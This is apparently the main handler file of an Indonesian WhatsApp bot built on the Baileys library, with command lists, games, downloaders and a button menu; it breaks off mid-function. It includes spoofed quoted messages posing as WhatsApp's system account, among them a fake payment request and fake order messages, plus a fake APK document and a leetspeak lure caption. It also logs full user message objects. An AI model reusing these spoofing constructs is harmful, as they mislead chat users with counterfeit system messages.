process.on('uncaughtException', console.error)
process.on('unhandledRejection', console.error)
/*
 * Recode By Sychyy @galang
 * Follow https://github.com/sychyy
 * Whatsapp : https://wa.me/6287862997267
 */
require('./settings');
require('./setown');
const config = require('./config.js');
const events = require('events');
// Set batas listener menjadi lebih tinggi, misalnya 20
events.EventEmitter.defaultMaxListeners = 100000;
// Atau set secara spesifik untuk `process`
process.setMaxListeners(100000);
const sharp = require('sharp');
const fs = require('fs');
const os = require('os');
const qs = require('qs');
const util = require('util');
const gis = require('g-i-s');
const Jimp = require('jimp');
const path = require('path');
const https = require('https');
const axios = require('axios');
const chalk = require('chalk');
const { youtube } = require("btch-downloader")
const yts = require('yt-search');
const ytdl = require('ytdl-core');

const cron = require('node-cron');
const cheerio = require('cheerio');
const fetch = require('node-fetch');
const { Readable } = require('stream');
const FileType = require('file-type');
const {
	JSDOM
} = require('jsdom');
const google = require('googlethis');
const similarity = require('similarity');
const PDFDocument = require('pdfkit');
const JsConfuser = require('js-confuser'); 
const JavaScriptObfuscator = require('javascript-obfuscator'); // Obfuscation JS
const webp = require('node-webpmux');
const ffmpeg = require('fluent-ffmpeg');
const speed = require('performance-now');
const didYouMean = require('didyoumean');
const {
	performance
} = require('perf_hooks');
const moment = require('moment-timezone');
const translate = require('translate-google-api');
const {
	Akinator,
	AkinatorAnswer
} = require('aki-api');
const {
	exec,
	spawn,
	execSync
} = require('child_process');
const {
  Presence, 
  MessageOptions,
  Mimetype,
  WALocationMessage,
  WA_MESSAGE_STUB_TYPES,
  ReconnectMode,
  ProxyAgent,
  GroupSettingChange,
  ChatModification,
  waChatKey,
  mentionedJid
} = require('@adiwajshing/baileys')
const {
	BufferJSON,
	WA_DEFAULT_EPHEMERAL,
	generateWAMessageFromContent,
	proto,
	downloadMediaMessage,
	getBinaryNodeChildren,
	generateWAMessageContent,
	MessageType,
	generateWAMessage,
	prepareWAMessageMedia,
	areJidsSameUser,
	getContentType
} = require('@whiskeysockets/baileys');
const prem = require('./src/premium');
const {
	LoadDataBase
} = require('./src/message');
const {
	TelegraPh,
	UguuSe
} = require('./lib/uploader');
const {
	toAudio,
	toPTT,
	toVideo
} = require('./lib/converter');
const {
	imageToWebp,
	videoToWebp,
	writeExif
} = require('./lib/exif');
const {
	rdGame,
	iGame,
	tGame,
	gameSlot,
	gameCasinoSolo,
	gameMerampok,
	gameBegal,
	daily,
	buy,
	setLimit,
	addLimit,
	addUang,
	setUang,
	transfer
} = require('./lib/game');

const {
    imageUploader,
    generateRandomText,
    toRupiah
} = require('./lib/functions.js');

const {
	pinterest,
	pinterest2,
	wallpaper,
	remini,
	wikimedia,
	quotesAnime,
	multiDownload,
	yanzGpt,
	happymod,
	umma,
	ringtone,
	jadwalsholat,
	styletext,
	tiktokDl,
	facebookDl,
	instaStory,
	bk9Ai,
	ytMp3,
	mediafireDl,
	quotedLyo,
	simi
} = require('./lib/screaper');
const {
	unixTimestampSeconds,
	generateMessageTag,
	processTime,
	webApi,
	getRandom,
	getBuffer,
	fetchJson,
	runtime,
	clockString,
	sleep,
	isUrl,
	getTime,
	formatDate,
	tanggal,
	formatp,
	jsonformat,
	reSize,
	toHD,
	logic,
	generateProfilePicture,
	bytesToSize,
	checkBandwidth,
	getSizeMedia,
	parseMention,
	getGroupAdmins,
	readFileTxt,
	readFileJson,
	getHashedPassword,
	generateAuthToken,
	cekMenfes,
	generateToken,
	batasiTeks,
	randomText,
	isEmoji,
	getTypeUrlMedia,
	pickRandom,
	getAllHTML
} = require('./lib/function');
// Read Database
const sewa = JSON.parse(fs.readFileSync('./database/sewa.json'));
const premium = JSON.parse(fs.readFileSync('./database/premium.json'));


// Database Game
let suit = db.game.suit = []
let menfes = db.game.menfes = []
let tekateki = db.game.tekateki = []
let akinator = db.game.akinator = []
let tictactoe = db.game.tictactoe = []
let tebaklirik = db.game.tebaklirik = []
let kuismath = db.game.kuismath = []
let tebaklagu = db.game.tebaklagu = []
let tebakkata = db.game.tebakkata = []
let family100 = db.game.family100 = []
let susunkata = db.game.susunkata = []
let tebakbom = db.game.tebakbom = []
let tebakkimia = db.game.tebakkimia = []
let caklontong = db.game.caklontong = []
let tebaknegara = db.game.tebaknegara = []
let tebakgambar = db.game.tebakgambar = []
let tebakepep = db.game.tebakepep = []
let tebakbendera = db.game.tebakbendera = []
let typemenu = "s4";
let typoDetectionEnabled = false; // Status default: aktif
let autoAi = false; // Default mati
// Variabel penyimpanan sesi chat rahasia
let secretChat = {};
// Penyimpanan status autoai2 (gunakan database jika diperlukan)
let autoAIStatus = false;
let _scommand = JSON.parse(fs.readFileSync("./database/scommand.json"));
// Variabel global untuk menyimpan prompt default
let llamaPrompt = "ngobrol singkat dengan bahasa indonesia tidak baku dan kamu adalah SychyyBotz";
let userPrompt = "kalo jawab pake bahasa indonesia ga baku aja dan kamu adalah SychyyBotz"; // Default prompt

let apkFile = {
    document: fs.readFileSync("src/media/fake.apk"), // Pastikan path benar
    fileName: " RKA STORE",
    mimetype: "application/vnd.android.package-archive", // MIME type untuk APK
    fileLength: "99999999999999999", // Ukuran file dalam byte (opsional)
    pageCount: "999" // Tidak terlalu berpengaruh untuk APK
};

// Kirim pesan dengan file APK



    
    // Fungsi untuk mengompres audio menggunakan ffmpeg
async function compressAudio(audioUrl) {
    const response = await fetch(audioUrl);
    const buffer = await response.buffer();

    const readableAudio = Readable.from(buffer);

    return new Promise((resolve, reject) => {
        const compressedAudio = ffmpeg()
            .input(readableAudio)
            .inputFormat('mp3')
            .audioBitrate(128) // Mengubah bitrate menjadi 128 kbps
            .audioCodec('libmp3lame')
            .format('mp3')
            .on('end', () => {
                console.log('Audio telah dikompres!');
            })
            .on('error', (err) => {
                reject(err);
            })
            .pipe(); // Menghasilkan output stream yang dapat dikirimkan

        resolve(compressedAudio);
    });
}

    
// Fungsi Menambahkan Command
const addCmd = (id, command) => {
	// Konversi hash ke Base64
	const base64Hash = Buffer.from(id).toString('base64');
	const obj = {
		id: base64Hash,
		chats: command
	}; // Simpan dengan Base64
	_scommand.push(obj);
	fs.writeFileSync("./database/scommand.json", JSON.stringify(_scommand, null, 2)); // Simpan ke database
};
// Fungsi Mendapatkan Posisi Command
const getCommandPosition = (id) => {
	const base64Hash = Buffer.from(id).toString('base64'); // Konversi ke Base64
	let position = null;
	Object.keys(_scommand).forEach((i) => {
		if (_scommand[i].id === base64Hash) {
			position = i;
		}
	});
	return position;
};




        const cmdGrup = ["linkgroup","ephemeral","setppgc","setname","setdesc","group","editinfo","add","kick","hidetag","tagall","totag","antilink","mute","promote","demote"]
        const cmdDown = ["tiktoknowm","tiktokwm","tiktokmp3","instagram","twitter","twittermp3","facebook","pinterestdl","ytmp3","ytmp4","getmusic","getvideo","joox","soundcloud"]
        const cmdSearch = ["play","yts","google","gimage","pinterest","wallpaper","wikimedia","ytsearch","ringtone","stalk","playstore","gsmarena","jadwalbioskop","nowplayingbioskop","aminio","wattpad","webtoons","drakor","iqra","hadist","alquran","tafsirsurah"]
        const cmdRand = ["coffe","quotesanime","motivasi","dilanquote","bucinquote","katasenja","puisi","couple","anime","waifu","husbu","neko","shinobu","waifus","nekos","trap","blowjob"]
        const cmdMaker = ["3dchristmas","3ddeepsea","americanflag","3dscifi","3drainbow","3dwaterpipe","halloweenskeleton","sketch","bluecircuit","space","metallic","fiction","greenhorror","transformer","berry","thunder","magma","3dcrackedstone","3dneonlight","impressiveglitch","naturalleaves","fireworksparkle","matrix","dropwater","harrypotter","foggywindow","neondevils","christmasholiday","3dgradient","blackpink","gluetext","shadow","romantic","smoke","burnpapper","naruto","lovemsg","grassmsg","lovetext","coffecup","butterfly","harrypotter","retrolol","ffcover","crossfire","galaxy","glass","neon","beach","blackpink","igcertificate","ytcertificate", "galang"]
        const cmdFun = ["simih","halah","hilih","huluh","heleh","holoh","jadian","jodohku","delttt","tictactoe","family100","tebak","math","suitpvp"]
        const cmdPrimbon = ["nomorhoki","artimimpi","artinama","ramaljodoh","ramaljodohbali","suamiistri","ramalcinta","cocoknama","pasangan","jadiannikah","sifatusaha","rezeki","pekerjaan","nasib","penyakit","tarot","fengshui","haribaik","harisangar","harisial","nagahari","arahrezeki","peruntungan","weton","karakter","keberuntungan","memancing","masasubur","zodiak","shio"]
        const cmdConv = ["attp","ttp","toimage","removebg","sticker","stickerwm","emojimix","emojimix2","tovideo","togif","tourl","tovn","tomp3","toaudio","ebinary","dbinary","styletext","smeme","bass","blown","deep","earrape","fast","fat","nightcore","reverse","robot","slow","tupai"]
        const cmdMain = ["ping","owner","menu","delete","infochat","quoted","listpc","listgc","listonline","speedtest","setcmd","listcmd","delcmd","lockcmd","addmsg","listmsg","getmsg","delmsg","anonymous","start","next","keluar"]
        const cmdOwner = ["react","chat","join","leave","block","unblock","bcgroup","bcall","setppbot","setexif","anticall","setstatus","setnamebot"]
        const allCmd = [...cmdGrup, ...cmdDown, ...cmdSearch, ...cmdRand, ...cmdMaker, ...cmdFun, ...cmdPrimbon, ...cmdConv, ...cmdMain, ...cmdOwner]
        
        

// Fungsi untuk menambahkan transaksi
function addTransaction(name, amount) {
    try {
        const transactionId = name || "Pengguna"; // ID transaksi menggunakan nama pengguna
        const transactions = JSON.parse(fs.readFileSync('./database/transaksi.json', 'utf8')) || [];  // Pastikan file kosong jika belum ada data

        const newTransaction = {
            id: transactionId, // Menggunakan nama pengguna sebagai ID transaksi
            name: name,
            amount: amount,
            status: 'pending', // Status awal adalah pending
            time: new Date().toISOString(), // Waktu transaksi
        };

        transactions.push(newTransaction);

        // Menyimpan transaksi baru ke file
        fs.writeFileSync('./database/transaksi.json', JSON.stringify(transactions, null, 2), 'utf8');
        return newTransaction; // Mengembalikan transaksi baru
    } catch (error) {
        console.error("Gagal menambahkan transaksi:", error);
        return null; // Jika gagal, return null
    }
}



// Fungsi Mendapatkan Command Berdasarkan Hash
const getCmd = (id) => {
	const base64Hash = Buffer.from(id).toString('base64'); // Konversi ke Base64
	let position = null;
	Object.keys(_scommand).forEach((i) => {
		if (_scommand[i].id === base64Hash) {
			position = i;
		}
	});
	if (position !== null) {
		return _scommand[position].chats;
	}
};
// Fungsi Mengecek Apakah Command Ada
const checkSCommand = (id) => {
	const base64Hash = Buffer.from(id).toString('base64'); // Konversi ke Base64
	let status = false;
	Object.keys(_scommand).forEach((i) => {
		if (_scommand[i].id === base64Hash) {
			status = true;
		}
	});
	return status;
};

// Fungsi Format Monospace
function monospace(string) {
	return '```' + string + '```';
}



// Fungsi untuk membaca semua nama case dari file
const getAllCases = () => {
    const fileContent = fs.readFileSync("./naze.js", "utf-8");
    const caseRegex = /case\s*['"`](.*?)['"`]\s*:/g;
    let match;
    const cases = [];
    while ((match = caseRegex.exec(fileContent)) !== null) {
        cases.push(match[1]);
    }
    console.log("Daftar case yang ditemukan:", cases); // Debugging
    return cases;
};

// Fungsi untuk mendeteksi typo dan memberikan saran
const detectTypoCommand = (input) => {
    const validCommands = getAllCases(); // Ambil semua nama case
    console.log("Input pengguna:", input); // Debugging
    console.log("Daftar case yang valid:", validCommands); // Debugging

    const suggestedCommand = didYouMean(input, validCommands);
    console.log("Saran dari didYouMean:", suggestedCommand); // Debugging

    if (suggestedCommand) {
        return `Apakah maksud kamu \`${suggestedCommand}\`?`;
    }
    return null;
};

// Contoh penggunaan
const inputPengguna = "helo"; // Ganti dengan input yang sebenarnya
const suggestion = detectTypoCommand(inputPengguna);

if (suggestion) {
    console.log(suggestion); // Output: "Apakah maksud kamu `hello`?"
} else {
    console.log("Perintah tidak dikenali.");
}
module.exports = sych = async (sych, m, chatUpdate, store) => {
	try {
		await LoadDataBase(sych, m);
		const content = JSON.stringify(m.message);
		
		const type = m.message ? Object.keys(m.message)[0] : null;
		let _chats = type === "conversation" && m.message.conversation ? m.message.conversation : type == "imageMessage" && m.message.imageMessage.caption ? m.message.imageMessage.caption : type == "videoMessage" && m.message.videoMessage.caption ? m.message.videoMessage.caption : type == "extendedTextMessage" && m.message.extendedTextMessage.text ? m.message.extendedTextMessage.text : type == "buttonsResponseMessage" && m.message[type].selectedButtonId ? m.message[type].selectedButtonId : type == "stickerMessage" && getCmd(m.message[type].fileSha256.toString("base64")) !== null && getCmd(m.message[type].fileSha256.toString("base64")) !== undefined ? getCmd(m.message[type].fileSha256.toString("base64")) : "";
		const cmd = (type === 'conversation') ? m.message.conversation : (type == 'imageMessage') ? m.message.imageMessage.caption : (type == 'videoMessage') ? m.message.videoMessage.caption : (type == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (type == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (type == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (type === 'interactiveResponseMessage') ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : (type == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (type === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : (type == 'stickerMessage') && (getCmd(m.message.stickerMessage.fileSha256.toString('hex')) !== null && getCmd(m.message.stickerMessage.fileSha256.toString('base64')) !== undefined) ? getCmd(m.message.stickerMessage.fileSha256.toString('base64')) : "".slice(1).trim().split(/ +/).shift().toLowerCase()
		const botNumber = await sych.decodeJid(sych.user.id)
		const from = m.key.remoteJid;

// Daftar pengguna
let daftar = JSON.parse(fs.readFileSync('./database/daftar.json', 'utf-8') || '[]');

// Cek apakah pengguna sudah terdaftar berdasarkan ID
const isRegistered = daftar.some(user => user.id === m.sender);

// Fungsi untuk mendapatkan nama pengguna berdasarkan ID
const getUserName = (userId) => {
    const user = daftar.find(user => user.id === userId);
    return user ? user.name : null;
};
		// Dekode vote dari PollUpdateMessage
const decodeVote = (vote) => {
    return Buffer.from(vote.encPayload).toString('utf8'); // Sesuaikan dengan library WA
};

		
		const isCreator = isOwner = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
		const prefix = /^[°zZ#@+,.?=''():√%!¢£¥€π¤ΠΦ&><`™©®Δ^βα¦|/\\©^]/.test(cmd) ? cmd.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!™©®Δ^βα¦|/\\©^]/gi) : ''
		const body = (type === 'conversation') ? m.message.conversation : (type == 'imageMessage') ? m.message.imageMessage.caption : (type == 'videoMessage') ? m.message.videoMessage.caption : (type == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (type == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (type == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (type === 'interactiveResponseMessage') ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : (type == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (type === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : (type == 'stickerMessage') && (getCmd(m.message.stickerMessage.fileSha256.toString('base64')) !== null && getCmd(m.message.stickerMessage.fileSha256.toString('base64')) !== undefined) ? getCmd(m.message.stickerMessage.fileSha256.toString('base64')) : ""
		const budy = (typeof m.text == 'string' ? m.text : '')
		const isCmd = body.startsWith(prefix)
		const args = body.trim().split(/ +/).slice(1)
		const quoted = m.quoted ? m.quoted : m
		const command = isCreator ? body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase() : isCmd ? body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase() : ''
		  const query = body.trim().split(/ +/).slice(1).join(' ');
    const params = query.split('|').map(param => param.trim());
     const _0x4d375b = fs.readFileSync("./src/media/sychy.png");
       
		const text = args.join(' ')
		const q = args.join(' ')
		const mime = (quoted.msg || quoted).mimetype || ''
		const qmsg = (quoted.msg || quoted)
		const hari = moment.tz('Asia/Jakarta').locale('id').format('dddd');
		const tanggal = moment.tz('Asia/Jakarta').locale('id').format('DD/MM/YYYY');
		const jam = moment().tz('Asia/Jakarta').locale('id').format('HH:mm:ss');
		const ucapanWaktu = jam < '05:00:00' ? 'Selamat Pagi 🌉' : jam < '11:00:00' ? 'Selamat Pagi 🌄' : jam < '15:00:00' ? 'Selamat Siang 🏙' : jam < '18:00:00' ? 'Selamat Sore 🌅' : jam < '19:00:00' ? 'Selamat Sore 🌃' : jam < '23:59:00' ? 'Selamat Malam 🌌' : 'Selamat Malam 🌌';
		const almost = 0.72
		const time = Date.now()
		const setv = pickRandom(listv)
		const readmore = String.fromCharCode(8206).repeat(999)
		const isVip = db.users[m.sender] ? db.users[m.sender].vip : false
		const isPremium = isCreator || prem.checkPremiumUser(m.sender, premium) || false
		const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
		const isNsfw = m.isGroup ? db.groups[m.chat].nsfw : false
		// Data untuk menyimpan status pengguna
		const emojis = global.emot;
		const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];
		const isQuotedSticker = type === "extendedTextMessage" && content.includes("stickerMessage");
		const extendedText = MessageType;
		const Styles = (text, style = 1) => {
  var xStr = 'abcdefghijklmnopqrstuvwxyz1234567890'.split('');
  var yStr = {
    1: 'ᴀʙᴄᴅᴇꜰɢʜɪᴊᴋʟᴍɴᴏᴘqʀꜱᴛᴜᴠᴡxʏᴢ1234567890'
  };
  var replacer = [];
  xStr.map((v, i) =>
    replacer.push({
      original: v,
      convert: yStr[style].split('')[i]
    })
  );
  var str = text.toLowerCase().split('');
  var output = [];
  str.map((v) => {
    const find = replacer.find((x) => x.original == v);
    find ? output.push(find.convert) : output.push(v);
  });
  return output.join('');
};

const pushname = m.pushName || "No Name"

    
function getFormattedDate() {
  var currentDate = new Date();
  var day = currentDate.getDate();
  var month = currentDate.getMonth() + 1;
  var year = currentDate.getFullYear();
  var hours = currentDate.getHours();
  var minutes = currentDate.getMinutes();
  var seconds = currentDate.getSeconds();
}
		// Fake
		sych.deleteMessage = async (chatId, key) => {
			try {
				await sych.sendMessage(chatId, {
					delete: key
				});
				console.log(`Pesan berhasil dihapus: ChatID - ${chatId}, Key -`, key);
			} catch (error) {
				console.error(`Gagal menghapus pesan: ChatID - ${chatId}, Key -`, key, 'Error:', error);
			}
		};
		const ftrol = {
			key: {
				participant: '0@s.whatsapp.net'
			},
			message: {
				orderMessage: {
					itemCount: 123,
					status: 1,
					surface: 1,
					message: `${ucapanWaktu} ${m.pushName ? m.pushName : 'Tanpa Nama'} 👋🏻`,
					orderTitle: `${ucapanWaktu} ${m.pushName ? m.pushName : 'Tanpa Nama'} 👋🏻`,
					thumbnail: fake.thumbnail,
					sellerJid: '0@s.whatsapp.net'
				}
			}
		}
const downloadMp3 = async (url) => {
    try {
        let look = await yts(url);
        let convert = look.videos[0];
        const pl = await youtube(convert.url);

        // Simulasi proses download 1% - 100%
        for (let i = 1; i <= 100; i++) {
            console.log(`Downloading: ${i}%`);
            await new Promise(resolve => setTimeout(resolve, 50)); // Delay untuk simulasi proses
        }
        console.log('Download complete.');

        // Log sebelum pengiriman
        console.log('Preparing to send audio...');

        await sych.sendMessage(m.chat, {
            audio: { url: pl.mp3 },
            fileName: convert.title + '.mp3',
            mimetype: 'audio/mpeg',
            contextInfo: {
                externalAdReply: {
                    title: convert.title,
                    body: botname,
                    thumbnailUrl: convert.image,
                    sourceUrl: pl.mp3,
                    mediaType: 1,
                    mediaUrl: convert.url,
                }
            },
        }, { quoted: m });

        // Log setelah pengiriman
        console.log('Audio sent successfully.');
    } catch (error) {
        console.error('Error during download or sending:', error);
    }
}

// Cetak seluruh objek 'm' untuk melihat struktur lengkap
console.log("Objek m:", m);

// Cetak properti 'message' dari 'm'
console.log("m.message:", m.message);

// Periksa apakah 'interactiveMessage' ada di dalam 'message'
console.log("m.message.interactiveMessage:", m.message?.interactiveMessage);

// Periksa 'nativeFlowMessage' di dalam 'interactiveMessage'
console.log("m.message.interactiveMessage?.nativeFlowMessage:", m.message?.interactiveMessage?.nativeFlowMessage);

// Periksa apakah 'buttons' tersedia di dalam 'nativeFlowMessage'
console.log("m.message.interactiveMessage?.nativeFlowMessage?.buttons:", m.message?.interactiveMessage?.nativeFlowMessage?.buttons);

// Jika 'buttons' adalah array, cetak jumlah tombol yang ada
if (Array.isArray(m.message?.interactiveMessage?.nativeFlowMessage?.buttons)) {
    console.log("Jumlah buttons:", m.message.interactiveMessage.nativeFlowMessage.buttons.length);
} else {
    console.log("buttons tidak tersedia atau bukan array");
}

// Cetak properti 'messageParams' di dalam 'nativeFlowMessage'
console.log("m.message.interactiveMessage?.nativeFlowMessage?.messageParams:", m.message?.interactiveMessage?.nativeFlowMessage?.messageParams);

// Periksa apakah 'Json' ada di dalam 'messageParams'
console.log("m.message.interactiveMessage?.nativeFlowMessage?.messageParams?.Json:", m.message?.interactiveMessage?.nativeFlowMessage?.messageParams?.Json);

// Jika 'Json' adalah objek, cetak isi lengkapnya
if (typeof m.message?.interactiveMessage?.nativeFlowMessage?.messageParams?.Json === "object") {
    console.log("Isi Json:", m.message.interactiveMessage.nativeFlowMessage.messageParams.Json);
} else {
    console.log("Json tidak tersedia atau bukan objek");
}

// Tambahan untuk mengecek apakah ada properti lain yang mungkin terlewat
console.log("Properti lain di m.message.interactiveMessage:", Object.keys(m.message?.interactiveMessage || {}));
console.log("Properti lain di m.message.interactiveMessage?.nativeFlowMessage:", Object.keys(m.message?.interactiveMessage?.nativeFlowMessage || {}));



		const floc = {
      key: { participant: "0@s.whatsapp.net" },
      message: { locationMessage: { name: `${prefix + command}`, jpegThumbnail: fake.thumbnail } },
    };
		const repPy = {
	key: {
		remoteJid: 'status@broadcast',
		participant: '0@s.whatsapp.net',
		fromMe: false,
		id: `${owname}`,
		participant: '0@s.whatsapp.net'
	},
	message: {
		requestPaymentMessage: {
			currencyCodeIso4217: "USD",
			amount1000: 999999999,
			requestFrom: '0@s.whatsapp.net',
			noteMessage: {
				extendedTextMessage: {
					text: `${botname}`
				}
			},
			expiryTimestamp: 999999999,
			amount: {
				value: 91929291929,
				offset: 1000,
				currencyCode: "INR"
			}
		}
	}
}
const qchanel = {
key: {
remoteJid: 'status@broadcast',
fromMe: false,
participant: '0@s.whatsapp.net'
},
message: {
newsletterAdminInviteMessage: {
newsletterJid: my.ch,
newsletterName: `${botname}`,
jpegThumbnail: fake.thumbnail,
caption: `${botname}`,
inviteExpiration: Date.now() + 1814400000
}
}}

const mess = {
    owner: "Hanya pemilik yang dapat menggunakan perintah ini.",
    private: "Perintah ini hanya dapat digunakan di grup.",
    group: "Perintah ini hanya dapat digunakan di grup.",
    wait: "Tunggu sebentar, proses sedang berlangsung...",
    done: "Proses selesai!",
};


        const memek = {
			key: {
				remoteJid: 'status@broadcast',
				participant: '0@s.whatsapp.net',
				fromMe: false,
				id: `${botname}`
			 },
       "message": {
                    "locationMessage": {
                    "name": 'Video 1 G4k ku4t d1 hut4n d1 g45',
                    "jpegThumbnail": ''
                          }
                        }
                      }

		const fkontak = {
			key: {
				participant: '0@s.whatsapp.net'
			},
			message: {
				orderMessage: {
					itemCount: 99999,
					status: 1,
					surface: 1,
					message: `${ucapanWaktu}, Bpk/ Ibu ${m.pushName ? m.pushName : 'Tanpa Nama'} `,
					orderTitle: `${ucapanWaktu} ${m.pushName ? m.pushName : 'Tanpa Nama'} 👋🏻`,
					thumbnail: fake.texz, //Gambarnye
					sellerJid: '0@s.whatsapp.net'
				}
			}
		}
		const ftroli2 = {
			key: {
				participant: '0@s.whatsapp.net'
			},
			message: {
				orderMessage: {
					itemCount: 123,
					status: 1,
					surface: 1,
					message: `${ucapanWaktu} ${m.pushName ? m.pushName : 'Tanpa Nama'} 👋🏻`,
					orderTitle: `${ucapanWaktu} ${m.pushName ? m.pushName : 'Tanpa Nama'} 👋🏻`,
					thumbnail: fake.texz, //Gambarnye
					sellerJid: '0@s.whatsapp.net'
				}
			}
		}
		
		const fmemek = {
			key: {
				remoteJid: 'status@broadcast',
				participant: '0@s.whatsapp.net',
				fromMe: false,
				id: `${botname}`
			 },
       "message": {
                    "locationMessage": {
                    "name": 'Indonesia\nPalembang, 23 Januari 2025',
                    "jpegThumbnail": ''
                          }
                        }
                      }
                      


async function downloadProductImage(msg, sock) {
    if (!msg.product.productImage) {
        console.log("Tidak ada gambar produk.");
        return;
    }

    try {
        // Pastikan ini adalah objek, bukan array
        const mediaMessage = msg.product.productImage;
        
        console.log("Coba download media:", JSON.stringify(mediaMessage, null, 2));

        let media = await downloadMediaMessage(
            mediaMessage,  // Langsung gunakan objeknya
            'buffer',
            {},
            { reuploadRequest: sock.updateMediaMessage }
        );

        console.log("Gambar berhasil diunduh!");
        return media;  // Buffer gambar
    } catch (err) {
        console.error("Gagal mendownload gambar:", err);
    }
}

	
		//kontol
		async function runKontolCase(m, sych, sycreply, isRegistered) {
  console.log("Debug - Memulai eksekusi runPpkCase");
// Emoji yang akan digunakan
const reactEmojis = ["⏳", "🕛", "🕒", "🕕", "🕘", "🕛", "✅"];

// Mengirimkan reaksi secara berurutan
for (const emoji of reactEmojis) {
    await sych.sendMessage(m.chat, {
        react: {
            text: emoji,
            key: m.key
        }
    });
}
  try {
    // Pengecekan status pendaftaran
    if (!isRegistered) {
      console.log("Debug - Pengguna belum terdaftar.");
      return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
    }
    
let profile;
				try {
					profile = await sych.profilePictureUrl(m.sender, 'image');
				} catch (e) {
					profile = fake.anonim;
				}

    let menu = `*_👋🏻 *Hello! I am Langz Bot Version 9999.*  
Ready products like nokos, and many more! Designed with precision and care, I ensure your experience is seamless and efficient.  

╭───❐ *I N F O R M A S I* ❐───✧  
├ 📜 *Bot Name* : Langz 
├ 👨‍💻 *Owner* : Galang  
├ 🌐 *Version* : 9999  
├ 🛒 *Product* : Nokos  
╰─────────────────────✧  

💡 *Feel free to explore all my features using the menu provided!*  
🔰 Powered by Galangz _*`;

    // Tombol utama
let buttons = [
    { buttonId: ".bot mode self", buttonText: { displayText: " Self " }, type: 1 },
    { buttonId: ".bot mode public", buttonText: { displayText: " Public " }, type: 1 },
    
    // Tambahkan tombol cta_url di sini
        {
        buttonId: 'action',
        buttonText: { displayText: 'This Button List' },
        type: 4,
        nativeFlowInfo: {
            name: 'single_select',
            paramsJson: JSON.stringify({
                title: "Select Menu!",
                sections: [
                    {
                        title: "Silahkan Pilih Button Menu di Bawah Ini",
                        highlight_label: "Powered by Galangz",
                        rows: [
                            { title: " All Menu", description: " Semua Menu", id: ".allmenuu" },
                            { title: " Owner", description: " Info Owner", id: ".pepek" },
                            { title: " Produk", description: " Produk Info", id: ".produk" },
                            { title: " Donasi", description: " Donasi Dong", id: ".donasi" },
                            { title: " Group Menu", description: " Menu Group", id: ".grupmenu" },
                            { title: " Setting Bot", description: " Pengaturan Bot", id: ".bot byy" }
                        ]
                    }
                ]
            })
        },
        viewOnce: true
    },
   
    
];

    // Pesan dengan media video
    let buttonMessage = {
    document: fake.docs,
        fileName: ucapanWaktu,
        mimetype: pickRandom(fake.listfakedocs),
        fileLength: '100000000000000',
        pageCount: '999',
        image: {
            url: "./src/media/sych.png", // Pastikan file ini tersedia
            gifPlayback: true
        },
        caption: `${menu}`, // Teks menu
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            externalAdReply: {
                title: "Bot Status",
                body: "🟢 Active",
                thumbnailUrl: profile,
                mediaType: 1,
                renderLargerThumbnail: true,
                previewType: 0,
             
                mediaUrl: my.gh,
                sourceUrl: my.gh
            }
        },
        footer: "© Langz",
        buttons: buttons,
        viewOnce: true,
        headerType: 4
    };

    // Tambahan flow actions
    const flowActions = [
    {
        buttonId: 'action',
        buttonText: { displayText: 'This Button List' },
        type: 4,
        nativeFlowInfo: {
            name: 'single_select',
            paramsJson: JSON.stringify({
                title: "Select Menu!",
                sections: [
                    {
                        title: "Silahkan Pilih Button Menu di Bawah Ini",
                        highlight_label: "Powered by Galangz",
                        rows: [
                            { title: " All Menu", description: " Semua Menu", id: ".allmenuu" },
                            { title: " Owner", description: " Info Owner", id: ".pepek" },
                            { title: " Produk", description: " Produk Info", id: ".produk" },
                            { title: " Donasi", description: " Donasi Dong", id: ".donasi" },
                            { title: " Group Menu", description: " Menu Group", id: ".grupmenu" },
                            { title: " Setting Bot", description: " Pengaturan Bot", id: ".bot byy" }
                        ]
                    }
                ]
            })
        },
        viewOnce: true
    },
   
    
];


    // Tambahkan flowActions ke buttonMessage
    buttonMessage.buttons.push(...flowActions);

    // Kirim pesan
    await sych.sendMessage(m.chat, buttonMessage, { quoted: fkontak });
    console.log("Debug - Pesan carousel berhasil dikirim.");

  } catch (error) {
    console.error("Debug - Kesalahan saat mengirim carousel:", error);
    await sych.sendMessage(m.chat, {
      text: "Terjadi kesalahan saat mengirim pesan carousel. Silakan hubungi AI untuk memeriksa log kesalahan."
    }, {
      quoted: m
    });
  }
}
			//UJICOBS
				async function sendInteractiveForm(sych, jid) {
    try {
        const message = {
            key: {
                remoteJid: jid, // ID penerima
                fromMe: true,
                id: generateUniqueId(), // Fungsi untuk membuat ID unik
            },
            messageTimestamp: Math.floor(Date.now() / 1000), // Timestamp Unix
            message: {
                interactiveMessage: {
                    body: {
                        text: "Fill up the form and I will get right in touch with you ☺️\n\nℹ️ The more accurate your answers are, the faster & better I can help you.",
                    },
                    nativeFlowMessage: {
                        buttons: [
                            {
                                name: "galaxy_message",
                                buttonParamsJson: JSON.stringify({
                                    mode: "published",
                                    flow_message_version: "3",
                                    flow_token: "1:1307913409923914:750445b6ec7dce6db2a09bde2d6154e6",
                                    flow_id: "1307913409923914",
                                    flow_cta: "Talk to us",
                                    flow_action: "navigate",
